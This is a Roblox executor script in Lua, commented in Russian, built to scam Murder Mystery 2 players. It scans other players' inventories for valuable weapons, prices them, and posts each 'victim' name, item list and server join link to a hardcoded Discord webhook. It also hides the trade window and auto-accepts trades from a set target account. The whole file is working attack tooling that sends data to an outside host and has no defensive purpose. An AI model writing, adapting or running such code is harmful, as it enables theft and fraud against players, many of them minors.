 -- language: Lua, file: mm2_full.lua, runtime: Roblox executor (Synapse/Delta/Krnl)
-- сканер + слив + автоприём трейда от жертвы
-- замена: WEBHOOK_URL + target

local WEBHOOK_URL = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
local target      = "playing_mm2my"   -- ник получателя (кого ищем / куда годли)
local TARGET_GAME = 142823291          -- MM2 PlaceId

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local StarterGui        = game:GetService("StarterGui")
local LocalPlayer       = Players.LocalPlayer
local HttpRequest       = (syn and syn.request) or (http and http.request) or http_request or request

if not HttpRequest then
    warn("executor has no http.request")
    return
end

if game.PlaceId ~= TARGET_GAME then
    LocalPlayer:Kick("Wrong game")
    return
end

-- ─── цены ───
local PRICES = {
    ["Nik's Scythe"]=25000000, ["Chroma Luger"]=60, ["Chroma Shark"]=40,
    ["Chroma Laser"]=35, ["Chroma Slasher"]=27, ["Chroma Fang"]=57,
    ["Chroma Heat"]=80, ["Chroma Saw"]=42, ["Chroma DeathShard"]=58,
    ["Chroma Tides"]=62, ["Chroma Boneblade"]=58, ["Chroma Gingerblade"]=57,
    ["Elderwood Revolver"]=58, ["Elderwood Scythe"]=38, ["Batwing"]=43,
    ["Icewing"]=15, ["Corrupt"]=475, ["Red Luger"]=42, ["Green Luger"]=30,
    ["Sugar"]=145, ["Candy"]=155, ["Chill"]=24, ["Handsaw"]=10,
    ["Eternal"]=10, ["Eternal II"]=7, ["Boneblade"]=10, ["Clockwork"]=26,
    ["Hallow's Edge"]=15, ["Amerilaser"]=30, ["Old Glory"]=28,
    ["BattleAxe II"]=16, ["Spider"]=22, ["Pixel"]=24, ["Blaster"]=30,
}

local RARITY_RANK = {
    ["Common"]=1, ["Uncommon"]=2, ["Rare"]=3, ["Legendary"]=4,
    ["Godly"]=5, ["Ancient"]=6, ["Unique"]=7, ["Vintage"]=8,
}
local MIN_RANK = RARITY_RANK["Legendary"]

-- ─── инвентарь ───
local function getProfileData(player)
    local remotes    = ReplicatedStorage:WaitForChild("Remotes")
    local inventory  = remotes:WaitForChild("Inventory")
    local getProfile = inventory:WaitForChild("GetProfileData")
    local ok, data   = pcall(function()
        return getProfile:InvokeServer(player.Name)
    end)
    if not ok or not data or not data.Weapons or not data.Weapons.Owned then
        return nil
    end
    return data
end

local function resolveItemNames(data)
    local names = {}
    local db = ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync")
    local itemModule = require(db:WaitForChild("Item"))
    for id, count in pairs(data.Weapons.Owned) do
        if count > 0 then
            local meta = itemModule[id]
            if meta then
                names[id] = { ItemName = meta.ItemName, Rarity = meta.Rarity }
            end
        end
    end
    return names
end

local function collectValuables(player)
    local data = getProfileData(player)
    if not data then return nil end

    local meta = resolveItemNames(data)
    local list = {}
    local total = 0

    for id, count in pairs(data.Weapons.Owned) do
        local m = meta[id]
        if m and count > 0 then
            local rank = RARITY_RANK[m.Rarity] or 0
            if rank >= MIN_RANK then
                local value = PRICES[m.ItemName] or 0
                table.insert(list, {
                    name   = m.ItemName,
                    rarity = m.Rarity,
                    value  = value,
                    count  = count,
                })
                total = total + value * count
            end
        end
    end

    if #list == 0 then return nil end
    return list, total
end

-- ─── слив ───
local function exfil(player, list, total)
    local lines = {}
    for i, entry in ipairs(list) do
        if i > 20 then break end
        local suffix = entry.count > 1 and (" x" .. entry.count) or ""
        table.insert(lines, string.format("%s — %d%s", entry.name, entry.value, suffix))
    end
    if #list > 20 then
        table.insert(lines, string.format("and %d more...", #list - 20))
    end

    local joinLink = string.format(
        "https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s",
        game.PlaceId, game.JobId
    )

    local payload = {
        embeds = {{
            title       = "🔪 MM2 Hit",
            description = "Join and accept trade",
            color       = 16755200,
            fields      = {
                { name = "Victim",      value = player.Name,                              inline = false },
                { name = "Target",      value = target,                                   inline = true  },
                { name = "Items",       value = "```" .. table.concat(lines, "\n") .. "```", inline = false },
                { name = "Total Value", value = "```" .. math.floor(total) .. "```",       inline = false },
                { name = "Join",        value = "[Click to join](" .. joinLink .. ")",     inline = false },
                { name = "Server",      value = string.format("roblox://placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId), inline = false },
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }},
    }

    local body = HttpService:JSONEncode(payload)
    local ok, err = pcall(function()
        HttpRequest({
            Url     = WEBHOOK_URL,
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = body,
        })
    end)

    if not ok then
        warn("[exfil fail] " .. tostring(err))
    end
end

-- ─── скрыть TradeGUI когда прилетит трейд ───
local function hideTradeGui()
    local pg = LocalPlayer:WaitForChild("PlayerGui")
    local function kill(g)
        if g.Name == "TradeGUI" or g.Name == "TradeGUI_Phone" then
            g.Enabled = false
            g:GetPropertyChangedSignal("Enabled"):Connect(function()
                g.Enabled = false
            end)
        end
    end
    for _, c in ipairs(pg:GetChildren()) do kill(c) end
    pg.ChildAdded:Connect(kill)
end

-- ─── автоприём трейда от жертвы ───
-- (работает если жертва шлёт ТЕБЕ реквест сама, или ты используешь target-скрипт у неё)
local function setupAutoAccept()
    pcall(function()
        local trade = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Trade")
        local RequestSent = trade:WaitForChild("RequestSent")
        local AcceptRequest = trade:WaitForChild("AcceptRequest")
        local DeclineRequest = trade:WaitForChild("DeclineRequest")

        RequestSent.OnClientEvent:Connect(function(sender)
            if sender and sender.Name == target then
                -- это от нашей цели — принимаем
                AcceptRequest:FireServer()
            else
                DeclineRequest:FireServer()
            end
        end)
    end)
end

-- ─── мейн ───
local function scanAll()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local list, total = collectValuables(player)
            if list then
                exfil(player, list, total)
            end
        end
    end
end

Players.PlayerAdded:Connect(function(plr)
    task.wait(15)
    if plr == LocalPlayer then return end
    local list, total = collectValuables(plr)
    if list then exfil(plr, list, total) end
end)

hideTradeGui()
setupAutoAccept()

task.wait(5)
scanAll()
